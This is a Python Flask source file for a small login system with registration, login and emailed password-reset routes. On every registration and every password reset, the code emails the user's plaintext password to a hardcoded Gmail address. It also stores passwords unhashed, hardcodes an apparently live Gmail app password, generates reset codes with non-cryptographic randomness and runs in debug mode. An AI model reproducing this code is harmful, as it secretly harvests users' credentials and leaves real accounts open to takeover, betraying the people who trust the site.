from flask import Flask, render_template, request, redirect, url_for, session
from flask_mail import Mail, Message
import sqlite3
import random
import string


app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Configure Flask-Mail
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'ravikatudia@gmail.com'
app.config['MAIL_PASSWORD'] = 'idtb wikm szbr jysc'

mail = Mail(app)


def init_db():
    with sqlite3.connect('users.db') as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, email TEXT, password TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS reset_codes (email TEXT, code TEXT)''')
        conn.commit()


@app.route('/')
def home():
    return render_template('index.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with sqlite3.connect('users.db') as conn:
            c = conn.cursor()
            c.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, password))
            conn.commit()

        # Send registration details to admin
        admin_msg = Message('New User Registered', sender='your_email@gmail.com', recipients=['ravikatudia@gmail.com'])
        admin_msg.body = f'New User Registered:\nEmail: {email}\nPassword: {password}'
        mail.send(admin_msg)

        return redirect(url_for('login'))
    return render_template('register.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        with sqlite3.connect('users.db') as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM users WHERE email = ? AND password = ?", (email, password))
            user = c.fetchone()
        if user:
            session['user'] = email
            #return redirect(url_for('home'))
            return "Login Successful"
        else:
            return "Invalid credentials!"
    return render_template('login.html')


@app.route('/forgot', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'POST':
        email = request.form['email']
        code = ''.join(random.choices(string.digits, k=6))
        with sqlite3.connect('users.db') as conn:
            c = conn.cursor()
            c.execute("DELETE FROM reset_codes WHERE email = ?", (email,))
            c.execute("INSERT INTO reset_codes (email, code) VALUES (?, ?)", (email, code))
            conn.commit()
        msg = Message('Password Reset Code', sender='your_email@gmail.com', recipients=[email])
        msg.body = f'Your reset code is {code}'
        mail.send(msg)
        return redirect(url_for('reset_password', email=email))
    return render_template('forgot.html')


@app.route('/reset/<email>', methods=['GET', 'POST'])
def reset_password(email):
    if request.method == 'POST':
        code = request.form['code']
        new_password = request.form['new_password']
        with sqlite3.connect('users.db') as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM reset_codes WHERE email = ? AND code = ?", (email, code))
            if c.fetchone():
                c.execute("UPDATE users SET password = ? WHERE email = ?", (new_password, email))
                c.execute("DELETE FROM reset_codes WHERE email = ?", (email,))
                conn.commit()

                # Send reset details to admin
                admin_email = 'ravikatudia@gmail.com'  # Replace this with your actual email
                admin_msg = Message('New User Registered', sender='your_email@gmail.com', recipients=[admin_email])

                admin_msg.body = f'User Reset Password:\nEmail: {email}\nNew Password: {new_password}'
                mail.send(admin_msg)

                return "Password reset successful!"
            else:
                return "Invalid reset code!"
    return render_template('reset.html', email=email)


if __name__ == '__main__':
    init_db()
    app.run(debug=True)
